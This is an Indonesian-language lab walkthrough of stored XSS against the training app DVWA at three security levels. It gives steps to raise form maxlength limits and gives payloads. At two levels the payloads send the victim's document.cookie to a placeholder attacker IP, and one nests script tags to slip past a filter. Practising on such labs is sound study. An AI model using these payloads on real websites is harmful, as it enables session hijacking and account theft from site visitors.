# XSS Stored
XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.

## Security Low
- Sebelum melakukan uji serangan, ubah maxlength pada **textarea** dari 50 menjadi 500 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%201.JPG)

- Masukkan script ini ke field **Message**
```sh
<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%202.JPG)

## Security Medium
- Sebelum melakukan uji serangan, ubah maxlength pada **input** dari 10 menjadi 100 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%203.JPG)

- Masukkan script ini ke field **Name**
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%204.JPG)

## Security High
- Ubah maxlength pada **input** menjadi 100 karakter seperti pada langkah sebelumnya
- Masukkan script ini ke field **Name**
```sh
<a onclick="alert(document.cookie)" style=display:block>test</a>
```
